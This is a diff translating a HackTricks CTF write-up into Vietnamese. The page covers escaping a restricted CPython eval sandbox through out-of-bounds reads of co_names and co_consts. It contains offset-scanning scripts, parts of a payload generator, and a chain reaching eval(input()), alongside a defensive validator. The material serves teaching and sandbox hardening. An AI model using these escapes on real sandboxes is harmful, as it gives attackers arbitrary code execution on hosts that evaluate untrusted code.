@@ -2,17 +2,17 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-This page adapts Splitline's original HITCON CTF 2022 "V O I D" writeup and exploit chain.<sup>[[1]](#references)</sup>
+Trang này phỏng theo bài writeup và exploit chain gốc của Splitline cho HITCON CTF 2022 "V O I D".<sup>[[1]](#references)</sup>
 
-### TL;DR <a href="#tldr-2" id="tldr-2"></a>
+### Tóm tắt <a href="#tldr-2" id="tldr-2"></a>
 
-A `LOAD_NAME` or `LOAD_CONST` operand can read outside a deliberately shortened `co_names` or `co_consts` tuple. In this challenge, unreachable dummy names are used until a nearby entry contains a useful attribute such as `__getattribute__`.<sup>[[1]](#references)</sup>
+Operand của `LOAD_NAME` hoặc `LOAD_CONST` có thể đọc vượt ra ngoài tuple `co_names` hoặc `co_consts` đã bị cố ý rút ngắn. Trong challenge này, các name giả không thể truy cập được dùng cho đến khi một entry lân cận chứa một attribute hữu ích như `__getattribute__`.<sup>[[1]](#references)</sup>
 
-The remaining payload reuses that recovered name to build a sandbox escape.<sup>[[1]](#references)</sup>
+Payload còn lại tái sử dụng name đó để tạo sandbox escape.<sup>[[1]](#references)</sup>
 
-### Overview <a href="#overview-1" id="overview-1"></a>
+### Tổng quan <a href="#overview-1" id="overview-1"></a>
 
-The challenge wrapper is short and compiles one expression before evaluating it:<sup>[[1]](#references)</sup>
+Wrapper của challenge khá ngắn và compile một expression trước khi đánh giá nó:<sup>[[1]](#references)</sup>
 
 ```python
 source = input('>>> ')
@@ -21,15 +21,15 @@ code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))
 ```
 
-The input is compiled to a Python code object, then the wrapper replaces its `co_consts` and `co_names` with empty tuples before calling `eval`.<sup>[[1]](#references)[[5]](#references)</sup>
+Đầu vào được biên dịch thành một đối tượng mã Python, sau đó wrapper thay `co_consts` và `co_names` của nó bằng các tuple rỗng trước khi gọi `eval`.<sup>[[1]](#references)[[5]](#references)</sup>
 
-Any generated instruction that still indexes one of those tables can crash the interpreter or expose an adjacent object pointer, depending on the build.<sup>[[1]](#references)</sup>
+Bất kỳ instruction nào được tạo ra mà vẫn truy cập một trong các bảng đó đều có thể làm interpreter crash hoặc làm lộ con trỏ của đối tượng liền kề, tùy thuộc vào bản build.<sup>[[1]](#references)</sup>
 
 ### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
-How does the segfault happen?
+Segfault xảy ra như thế nào?
 
-For a list expression such as `[a, b, c]`, the compiler emits `LOAD_NAME` instructions with consecutive operands:<sup>[[1]](#references)[[2]](#references)</sup>
+Với một biểu thức list như `[a, b, c]`, compiler tạo các instruction `LOAD_NAME` có operand liên tiếp:<sup>[[1]](#references)[[2]](#references)</sup>
 
 ```
   1           0 LOAD_NAME                0 (a)
@@ -39,11 +39,11 @@ For a list expression such as `[a, b, c]`, the compiler emits `LOAD_NAME` instru
               8 RETURN_VALUE
 ```
 
-If `co_names` is replaced with `()`, the bytecode still carries `LOAD_NAME 2`; an unchecked tuple access can therefore fetch a pointer outside the tuple instead of raising `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>
+Nếu `co_names` được thay bằng `()`, bytecode vẫn chứa `LOAD_NAME 2`; do đó, thao tác truy cập tuple không kiểm tra có thể lấy một con trỏ nằm ngoài tuple thay vì phát sinh `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>
 
-`LOAD_NAME` and `LOAD_CONST` are the core primitives here: their integer operands select entries in `co_names` and `co_consts`, respectively.<sup>[[1]](#references)[[2]](#references)</sup>
+`LOAD_NAME` và `LOAD_CONST` là các primitive cốt lõi ở đây: các toán hạng số nguyên của chúng lần lượt chọn các mục trong `co_names` và `co_consts`.<sup>[[1]](#references)[[2]](#references)</sup>
 
-In CPython's dispatch, `LOAD_CONST` retrieves the selected tuple entry and pushes it; release builds use an unchecked tuple accessor:<sup>[[3]](#references)</sup>
+Trong cơ chế dispatch của CPython, `LOAD_CONST` lấy mục tuple đã chọn và đẩy nó lên; các bản build release dùng accessor tuple không kiểm tra:<sup>[[3]](#references)</sup>
 
 ```c
 case TARGET(LOAD_CONST): {
@@ -55,13 +55,13 @@ case TARGET(LOAD_CONST): {
 }
 ```
 
-Probe increasing `LOAD_NAME` operands on the target interpreter to map useful entries. Splitline observed useful offsets above 700 in the challenge environment, but the layout is build-specific; a debugger can help inspect the surrounding memory.<sup>[[1]](#references)</sup>
+Thử các toán hạng `LOAD_NAME` tăng dần trên trình thông dịch mục tiêu để lập bản đồ các mục hữu ích. Splitline quan sát thấy các offset hữu ích trên 700 trong môi trường thử thách, nhưng bố cục phụ thuộc vào bản build; debugger có thể giúp kiểm tra vùng bộ nhớ lân cận.<sup>[[1]](#references)</sup>
 
-### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
+### Tạo Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-Once an offset yields a useful name, place the out-of-range lookup in an unreachable expression and reference the same `co_names` slot from a reachable attribute access.<sup>[[1]](#references)</sup>
+Khi một offset trả về tên hữu ích, hãy đặt phép tra cứu ngoài phạm vi vào một biểu thức không thể được thực thi và tham chiếu cùng slot `co_names` đó từ một truy cập thuộc tính có thể được thực thi.<sup>[[1]](#references)</sup>
 
-For example, if offset 5 yields `__getattribute__`, keep that name at slot 5 while the false branch performs the useful lookup:<sup>[[1]](#references)</sup>
+Ví dụ, nếu offset 5 trả về `__getattribute__`, hãy giữ tên đó ở slot 5 trong khi nhánh sai thực hiện phép tra cứu hữu ích:<sup>[[1]](#references)</sup>
 
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
@@ -70,9 +70,9 @@ For example, if offset 5 yields `__getattribute__`, keep that name at slot 5 whi
 ]
 ```
 
-> The recovered text need not be `__getattribute__`; any identifier that serves the payload can occupy the slot.<sup>[[1]](#references)</sup>
+> Văn bản được khôi phục không nhất thiết phải là `__getattribute__`; bất kỳ định danh nào phục vụ payload đều có thể nằm ở vị trí này.<sup>[[1]](#references)</sup>
 
-The compiler reuses a `co_names` slot for repeated occurrences of one name, as the disassembly illustrates:<sup>[[1]](#references)[[2]](#references)</sup>
+Trình biên dịch sử dụng lại một slot trong `co_names` cho các lần xuất hiện lặp lại của cùng một tên, như bản disassembly minh họa:<sup>[[1]](#references)[[2]](#references)</sup>
 
 ```python
               0 BUILD_LIST               0
@@ -91,20 +91,20 @@ The compiler reuses a `co_names` slot for repeated occurrences of one name, as t
              26 RETURN_VALUE
 ```
 
-Because `LOAD_ATTR` also resolves its name through `co_names`, the reachable branch can reuse that slot; packed operands on newer CPython versions are described in the version notes below.<sup>[[1]](#references)[[2]](#references)</sup>
+Vì `LOAD_ATTR` cũng phân giải tên thông qua `co_names`, nhánh có thể tiếp cận có thể dùng lại slot đó; các operand được đóng gói trên những phiên bản CPython mới hơn được mô tả trong ghi chú phiên bản bên dưới.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Small non-negative integers can be synthesized from boolean expressions without constants:<sup>[[1]](#references)</sup>
+Có thể tạo các số nguyên không âm nhỏ từ biểu thức boolean mà không cần hằng số:<sup>[[1]](#references)</sup>
 
 - 0: not \[\[]]
 - 1: not \[]
 - 2: (not \[]) + (not \[])
 - ...
 
-### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
+### Kịch bản Exploit <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-The original exploit used names rather than constants to stay within the challenge's length limit.<sup>[[1]](#references)</sup>
+Exploit ban đầu dùng tên thay vì hằng số để đáp ứng giới hạn độ dài của thử thách.<sup>[[1]](#references)</sup>
 
-This helper scans candidate name offsets by constructing a code object with an empty `co_names` tuple.<sup>[[1]](#references)</sup>
+Helper này quét các offset tên có thể có bằng cách tạo một code object với tuple `co_names` rỗng.<sup>[[1]](#references)</sup>
 
 ```python
 from types import CodeType
@@ -141,7 +141,7 @@ if __name__ == '__main__':
 # for i in $(seq 0 10000); do python find.py $i ; done
 ```
 
-The generator below maps the recovered offsets to names and emits the source-level payload.<sup>[[1]](#references)</sup>
+Generator bên dưới ánh xạ các offset đã khôi phục sang tên và xuất payload ở cấp mã nguồn.<sup>[[1]](#references)</sup>
 
 ```python
 import sys
@@ -220,7 +220,7 @@ print(source)
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
 
-At a high level, the generated payload obtains a function's globals, recovers `builtins`, and calls `eval(input())`.<sup>[[1]](#references)</sup>
+Ở mức khái quát, payload được tạo sẽ lấy globals của một hàm, khôi phục `builtins` và gọi `eval(input())`.<sup>[[1]](#references)</sup>
 
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
@@ -237,19 +237,19 @@ builtins['eval'](builtins['input']())
 
 ---
 
-### Version notes and affected opcodes (Python 3.11–3.13)
+### Ghi chú phiên bản và các opcode bị ảnh hưởng (Python 3.11–3.13)
 
-- On CPython 3.11–3.13, instructions still use integer operands to index the code object's constant and name tables. If either tuple is shorter than a referenced index, an unchecked access can read an adjacent object pointer and crash or operate on it; exact behavior depends on the interpreter build.<sup>[[2]](#references)[[3]](#references)</sup>
-  - `LOAD_CONST consti` and (3.12+) `RETURN_CONST consti` read `co_consts[consti]`.<sup>[[2]](#references)</sup>
-  - Direct name-table users include `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR`, and (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
-  - `LOAD_GLOBAL namei` and `LOAD_ATTR namei` use `co_names[namei >> 1]`; the low bit controls the documented NULL/method behavior. (3.12+) `LOAD_SUPER_ATTR namei` uses `co_names[namei >> 2]` and packs two flags into its low bits.<sup>[[2]](#references)</sup>
-- Python 3.11+ introduced adaptive/inline caches that add hidden `CACHE` entries between instructions. Handcrafted bytecode must account for those entries when building `co_code`.<sup>[[2]](#references)</sup>
+- Trên CPython 3.11–3.13, các instruction vẫn dùng toán hạng số nguyên để truy cập các bảng constant và name của code object. Nếu một trong hai tuple ngắn hơn index được tham chiếu, thao tác truy cập không được kiểm tra có thể đọc một con trỏ object liền kề và gây crash hoặc thao tác trên object đó; hành vi chính xác phụ thuộc vào bản build của interpreter.<sup>[[2]](#references)[[3]](#references)</sup>
+  - `LOAD_CONST consti` và (3.12+) `RETURN_CONST consti` đọc `co_consts[consti]`.<sup>[[2]](#references)</sup>
+  - Các opcode trực tiếp dùng bảng name gồm `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` và (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
+  - `LOAD_GLOBAL namei` và `LOAD_ATTR namei` dùng `co_names[namei >> 1]`; bit thấp nhất điều khiển hành vi NULL/method được mô tả trong tài liệu. (3.12+) `LOAD_SUPER_ATTR namei` dùng `co_names[namei >> 2]` và mã hóa hai cờ trong các bit thấp nhất của nó.<sup>[[2]](#references)</sup>
+- Python 3.11+ giới thiệu adaptive/inline cache, bổ sung các mục `CACHE` ẩn giữa các instruction. Bytecode được tạo thủ công phải tính đến các mục này khi xây dựng `co_code`.<sup>[[2]](#references)</sup>
 
-Practical implication: bytecode layout and recovered offsets are release- and build-specific. Test the technique and any generated payload against the target CPython version before relying on it.<sup>[[2]](#references)</sup>
+Ý nghĩa thực tiễn: bố cục bytecode và các offset được khôi phục phụ thuộc vào phiên bản và bản build. Hãy kiểm tra kỹ thuật này và mọi payload được tạo trên phiên bản CPython mục tiêu trước khi sử dụng.<sup>[[2]](#references)</sup>
 
-### Quick scanner for useful OOB indexes (3.11+/3.12+ compatible)
+### Scanner nhanh để tìm các index OOB hữu ích (tương thích 3.11+/3.12+)
 
-If you prefer to probe for interesting objects directly from bytecode rather than from high-level source, you can generate minimal code objects and brute-force indices. The helper below inserts inline caches according to the target interpreter's `dis` metadata.<sup>[[2]](#references)</sup>
+Nếu muốn dò tìm trực tiếp các object đáng chú ý từ bytecode thay vì từ source cấp cao, bạn có thể tạo các code object tối giản và brute-force các index. Helper bên dưới chèn inline cache theo metadata `dis` của interpreter mục tiêu.<sup>[[2]](#references)</sup>
 
 ```python
 import dis, types
@@ -290,13 +290,13 @@ for idx in range(0, 300):
         print(idx, type(obj), repr(obj)[:80])
 ```
 
-Notes
-- To probe names instead, swap `LOAD_CONST` for `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` and adjust the stack usage and packed operand for the target opcode.<sup>[[2]](#references)</sup>
-- Use `EXTENDED_ARG` or multiple bytes of `arg` to reach indexes >255 if needed. This helper emits only the low operand byte, so larger indexes require raw byte construction or multiple loads.<sup>[[2]](#references)</sup>
+Ghi chú
+- Để thăm dò tên thay thế, đổi `LOAD_CONST` thành `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` và điều chỉnh cách dùng stack cùng toán hạng được đóng gói cho opcode mục tiêu.<sup>[[2]](#references)</sup>
+- Dùng `EXTENDED_ARG` hoặc nhiều byte `arg` để truy cập các chỉ mục >255 nếu cần. Helper này chỉ xuất byte toán hạng thấp, vì vậy các chỉ mục lớn hơn cần dựng byte thô hoặc thực hiện nhiều lần load.<sup>[[2]](#references)</sup>
 
-### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)
+### Mẫu RCE tối giản chỉ dùng bytecode (co_consts OOB → builtins → eval/input)
 
-Once you identify a `co_consts` index that resolves to the builtins module, you can reconstruct `eval(input())` without `co_names` by manipulating the stack. The official B01lers CTF 2024 `awpcode` material documents this same OOB-read pattern.<sup>[[4]](#references)</sup>
+Sau khi xác định được chỉ mục `co_consts` trỏ đến module builtins, bạn có thể dựng lại `eval(input())` mà không cần `co_names` bằng cách thao tác với stack. Tài liệu chính thức của B01lers CTF 2024 `awpcode` cũng mô tả mẫu OOB-read này.<sup>[[4]](#references)</sup>
 
 ```python
 # Build co_code that:
@@ -307,13 +307,13 @@ Once you identify a `co_consts` index that resolves to the builtins module, you 
 # This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
 ```
 
-This stack-only approach is useful when a challenge gives you direct control over `co_code` while forcing `co_consts=()` and `co_names=()`; it avoids source-level tricks and can keep payloads small by using bytecode stack operations and tuple builders.<sup>[[4]](#references)</sup>
+Cách tiếp cận chỉ dùng stack này hữu ích khi một challenge cho phép bạn kiểm soát trực tiếp `co_code` nhưng buộc `co_consts=()` và `co_names=()`; cách này tránh các thủ thuật ở cấp mã nguồn và có thể giúp payload nhỏ gọn bằng cách dùng các thao tác stack của bytecode và bộ dựng tuple.<sup>[[4]](#references)</sup>
 
-### Defensive checks and mitigations for sandboxes
+### Kiểm tra phòng thủ và biện pháp giảm thiểu cho sandbox
 
-If you are writing a Python sandbox that compiles or evaluates untrusted code, do not rely on CPython to bounds-check tuple indexes used by bytecode. Validate code objects before executing them.<sup>[[2]](#references)[[3]](#references)</sup>
+Nếu bạn viết một Python sandbox biên dịch hoặc đánh giá mã không đáng tin cậy, đừng dựa vào CPython để kiểm tra giới hạn của các chỉ mục tuple được bytecode sử dụng. Hãy xác thực các code object trước khi thực thi chúng.<sup>[[2]](#references)[[3]](#references)</sup>
 
-Practical validator (rejects OOB access to co_consts/co_names).<sup>[[2]](#references)</sup>
+Trình xác thực thực tế (từ chối truy cập OOB vào co_consts/co_names).<sup>[[2]](#references)</sup>
 
 ```python
 import dis
@@ -353,16 +353,15 @@ def validate_code_object(code: type((lambda:0).__code__)):
 # eval(c, {'__builtins__': {}})
 ```
 
-Additional mitigation ideas
-- Don’t allow arbitrary `CodeType.replace(...)` on untrusted input, or add strict structural checks on the resulting code object.
-- Consider running untrusted code in a separate process with OS-level sandboxing (seccomp, job objects, containers) instead of relying on CPython semantics.
+Các ý tưởng giảm thiểu bổ sung
+- Không cho phép gọi `CodeType.replace(...)` tùy ý trên đầu vào không đáng tin cậy, hoặc bổ sung các kiểm tra cấu trúc nghiêm ngặt đối với code object được tạo ra.
+- Cân nhắc chạy mã không đáng tin cậy trong một tiến trình riêng với sandbox ở cấp hệ điều hành (seccomp, job objects, containers), thay vì dựa vào ngữ nghĩa của CPython.
 
 ## References
 
-- [1] [Splitline's HITCON CTF 2022 writeup "V O I D" (origin of this technique and high-level exploit chain)](https://blog.splitline.tw/hitcon-ctf-2022/)
-- [2] [Python 3.13 `dis` documentation (bytecode indices, packed name operands, and inline caches)](https://docs.python.org/3.13/library/dis.html)
-- [3] [CPython 3.13.5 tuple-access macros (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
-- [4] [B01lers CTF 2024 `awpcode` challenge writeup (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
-- [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
-
+- [1] [Bài viết phân tích "V O I D" của Splitline tại HITCON CTF 2022 (nguồn gốc của kỹ thuật này và chuỗi khai thác ở mức khái quát)](https://blog.splitline.tw/hitcon-ctf-2022/)
+- [2] [Tài liệu `dis` của Python 3.13 (chỉ số bytecode, toán hạng tên được đóng gói và inline cache)](https://docs.python.org/3.13/library/dis.html)
+- [3] [Các macro truy cập tuple của CPython 3.13.5 (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
+- [4] [Bài viết phân tích thử thách `awpcode` tại B01lers CTF 2024 (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
+- [5] [Python C API: Đối tượng Code](https://docs.python.org/3/c-api/code.html)
 {{#include ../../../banners/hacktricks-training.md}}
